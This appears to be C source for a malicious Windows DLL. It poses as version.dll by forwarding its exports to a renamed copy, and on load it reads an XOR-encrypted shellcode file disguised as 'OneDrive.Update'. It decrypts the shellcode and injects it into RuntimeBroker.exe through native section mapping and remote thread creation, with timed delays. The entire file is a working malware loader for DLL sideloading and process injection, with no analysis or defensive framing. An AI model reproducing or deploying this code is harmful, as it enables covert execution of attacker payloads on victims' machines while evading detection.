#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Redirections to vresion.dll
#pragma comment(linker,"/export:VerQueryValueW=vresion.VerQueryValueW,@16")
#pragma comment(linker,"/export:GetFileVersionInfoSizeW=vresion.GetFileVersionInfoSizeW,@7")
#pragma comment(linker,"/export:GetFileVersionInfoW=vresion.GetFileVersionInfoW,@8")

// Define needed structs
typedef struct _CLIENT_ID {
   HANDLE UniqueProcess;
   HANDLE UniqueThread;
} CLIENT_ID,*PCLIENT_ID;
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService; 
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;

// Define functions to resolve
typedef NTSTATUS (NTAPI * tNtOpenProcess)(
  PHANDLE ProcessHandle,
  ACCESS_MASK DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PCLIENT_ID ClientId
);
typedef NTSTATUS (NTAPI * tNtCreateSection)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL
);
typedef NTSTATUS (NTAPI * tNtMapViewOfSection)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
);
typedef NTSTATUS(NTAPI * tNtDelayExecution)(
  BOOLEAN Alertable,
  PLARGE_INTEGER DelayInterval 
);

typedef NTSTATUS (WINAPI * tNtCreateThreadEx)
(
  PHANDLE hThread,
	ACCESS_MASK DesiredAccess,
	PVOID ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID lpStartAddress,
	PVOID lpParameter,
	ULONG Flags,
	SIZE_T StackZeroBits,
	SIZE_T SizeOfStackCommit,
	SIZE_T SizeOfStackReserve,
	PVOID lpBytesBuffer
);

typedef NTSTATUS (NTAPI * tNtClose)(
  HANDLE Handle
);

typedef  NTSTATUS (NTAPI * tZwUnmapViewOfSection)(
  HANDLE ProcessHandle,
  PVOID  BaseAddress
);

int FindPID(const char *procname) {

  HANDLE hProcSnap;
  PROCESSENTRY32 pe32;
  int pid = 0;
          
  hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
          
  pe32.dwSize = sizeof(PROCESSENTRY32); 
          
  if (!Process32First(hProcSnap, &pe32)) {
    CloseHandle(hProcSnap);
    return 0;
  }
          
  while (Process32Next(hProcSnap, &pe32)) {
    if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
    }
  }
          
  CloseHandle(hProcSnap);
          
  return pid;
}

void Load() {
  HMODULE hNtdll;
  int pid = 0;
  HANDLE hProc = NULL;
  OBJECT_ATTRIBUTES obj_att={sizeof(OBJECT_ATTRIBUTES), 0, NULL,0};
  CLIENT_ID cid;
  char * p;
  HANDLE hSec = NULL;
	PVOID pLView = NULL, pRView = NULL;
  FILE * pFile;
  SIZE_T payload_size;
  SIZE_T payload_size_view;
  unsigned char * payload;
  LARGE_INTEGER DelayInterval;
	LONGLONG llDelay = 3;    // Interval in seconds
  HANDLE hThread = NULL;
  char key[] = "jikoewarfkmzsdlhfnuiwaejrpaw";

  // Find RuntimeBroker PID
  pid = FindPID("RuntimeBroker.exe");
  if(!pid){
    return;
  };

  // Read shellcode from OneDrive.Update
  pFile = fopen("OneDrive.Update", "rb");
  if(pFile == NULL){
    return;
  }
  fseek(pFile, 0, SEEK_END);
  payload_size = ftell(pFile);
  rewind(pFile);
  payload = (unsigned char *)malloc(payload_size);
  fread(payload, payload_size, 1, pFile);
  fclose(pFile);

  // Get a handle to ntdll
  hNtdll = GetModuleHandleA("NTDLL.DLL");
  if (hNtdll == NULL){
		return;
  }

  // Open Process calling NtOpenProcess (ZwOpenProcess)
  tNtOpenProcess pNtOpenProcess = (tNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
  if (pNtOpenProcess == NULL){
		return;
  }
  cid.UniqueProcess = (PVOID)pid;
  cid.UniqueThread = 0;
  pNtOpenProcess(&hProc, GENERIC_ALL, &obj_att, &cid);
  if(hProc == NULL){
    return;
  }

  // Create Section
  tNtCreateSection pNtCreateSection = (tNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
  if (pNtCreateSection == NULL){
		return;
  }
  pNtCreateSection(&hSec, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&payload_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

  // Create local view
  tNtMapViewOfSection pNtMapViewOfSection = (tNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
  if (pNtMapViewOfSection == NULL){
		return;
  }
  payload_size_view = payload_size;
  pNtMapViewOfSection(hSec, GetCurrentProcess(), &pLView, NULL, NULL, NULL, &payload_size_view, ViewUnmap, NULL, PAGE_READWRITE);

  // Copy and decrypt pyload to local view
  p = (char *)pLView;
  for(int i =0; i < payload_size; ++i){
    *(p++) = payload[i] ^ key[i % (sizeof(key)-1)];
  }

  // Create remote view in RuntimeBroker
  payload_size_view = payload_size;
  pNtMapViewOfSection(hSec, hProc, &pRView, NULL, NULL, NULL, &payload_size_view, ViewUnmap, NULL, PAGE_EXECUTE_READ);

  // Delay execution
  tNtDelayExecution pNtDelayExecution = (tNtDelayExecution)GetProcAddress(hNtdll, "NtDelayExecution");
  DelayInterval.QuadPart = -llDelay * 10000000;
  pNtDelayExecution(FALSE, (PLARGE_INTEGER)&DelayInterval);

  // Start a new thread in RuntimeBroker
  tNtCreateThreadEx pNtCreateThreadEx = (tNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
  pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc, pRView, NULL, NULL, NULL, NULL, NULL, NULL);
  if(hThread == NULL){
    return;
  }

  // Delay execution
  pNtDelayExecution(FALSE, (PLARGE_INTEGER)&DelayInterval);

  // Cleaning
  tNtClose pNtClose = (tNtClose)GetProcAddress(hNtdll, "NtClose");
  pNtClose(hSec);

  tZwUnmapViewOfSection pZwUnmapViewOfSection = (tZwUnmapViewOfSection)GetProcAddress(hNtdll, "ZwUnmapViewOfSection");
  pZwUnmapViewOfSection(GetCurrentProcess(), pLView);
  pZwUnmapViewOfSection(hProc, pRView);

  pNtClose(hProc);

  return;
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
      Load();
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
